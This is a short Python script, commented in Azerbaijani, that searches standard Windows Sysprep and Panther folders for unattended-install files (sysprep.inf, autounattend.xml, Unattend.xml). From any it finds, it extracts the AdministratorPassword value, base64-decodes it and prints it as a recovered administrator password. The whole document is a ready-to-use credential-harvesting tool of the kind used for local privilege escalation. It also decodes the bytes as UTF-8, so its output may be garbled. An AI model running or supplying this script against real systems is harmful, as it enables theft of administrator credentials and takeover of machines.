import os
import re
import base64

# 1. Faylların yerləşə biləcəyi tipik qovluqlar və hədəf fayl adları
possible_dirs = [
    r"C:\Windows\Panther",
    r"C:\Windows\System32\Sysprep",
    r"C:\Windows\Panther\Unattend",
    r"C:\\"
]
target_files = ["sysprep.inf", "autounattend.xml", "Unattend.xml"]

def find_and_extract():
    # Hər bir qovluğu və faylı yoxlayırıq
    for directory in possible_dirs:
        for filename in target_files:
            full_path = os.path.join(directory, filename)
            
            if os.path.exists(full_path):
                print(f"[+] Fayl tapıldı: {full_path}")
                try:
                    with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        
                        # 2. Şifrəni tapmaq üçün Regex istifadəsi
                        # <Value>...</Value> teqləri arasındakı base64 kodu götürür
                        pattern = r"<AdministratorPassword>.*?<Value>(.*?)</Value>"
                        match = re.search(pattern, content, re.DOTALL)
                        
                        if match:
                            encoded_password = match.group(1)
                            print(f"[+] Kodlaşdırılmış şifrə tapıldı: {encoded_password}")
                            
                            # 3. Base64 formatından dekod edilməsi
                            decoded_bytes = base64.b64decode(encoded_password)
                            decoded_password = decoded_bytes.decode("utf-8")
                            
                            print(f"\n[***] UĞURLU! Administrator Şifrəsi: {decoded_password}\n")
                            return decoded_password
                except Exception as e:
                    print(f"[-] Fayl oxunarkən xəta baş verdi: {e}")
    print("[-] Təssüf ki, heç bir faylda şifrə tapılmadı.")
    return None

if __name__ == "__main__":
    find_and_extract()
